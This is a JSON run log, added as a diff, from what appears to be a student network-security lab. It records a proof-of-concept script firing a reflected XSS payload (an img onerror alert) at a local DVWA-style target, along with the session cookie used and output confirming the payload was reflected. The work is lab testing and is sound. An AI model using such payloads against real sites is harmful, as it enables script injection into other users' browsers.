@@ -1,0 +1,28 @@
+{
+  "cmd": [
+    "C:\\Users\\12396\\.dsh\\dsh-runtimes\\dsh-primary-runtime\\dependencies\\python\\python.exe",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v1\\XSS-002__1.py",
+    "--base",
+    "http://127.0.0.1:9080",
+    "--path",
+    "/vulnerabilities/xss_r/",
+    "--session-cookie",
+    "e0tlcj9jtt56uhh8sofohtcfen; security=<level>"
+  ],
+  "started_at": "2026-10-20T14:43:24+08:00",
+  "returncode": 0,
+  "elapsed_seconds": 0.214,
+  "stdout": "[*] GET http://127.0.0.1:9080/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS002%27%29%3E\r\n[*] HTTP 200, Content-Type: text/html;charset=utf-8\r\n[*] raw payload present in response body: True\r\n[*] observation: payload reflected verbatim; browser execution NOT verified here.\r\n[*] manual step: open the same URL in a lab browser and check for the alert('XSS002') dialog.\r\n",
+  "stderr": "",
+  "cohort": "v1",
+  "stem": "XSS-002__1",
+  "poc": "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v1\\XSS-002__1.py",
+  "args_redacted": [
+    "--base",
+    "http://127.0.0.1:9080",
+    "--path",
+    "/vulnerabilities/xss_r/",
+    "--session-cookie",
+    "e0tlcj9jtt56uhh8sofohtcfen; security=<level>"
+  ]
+}
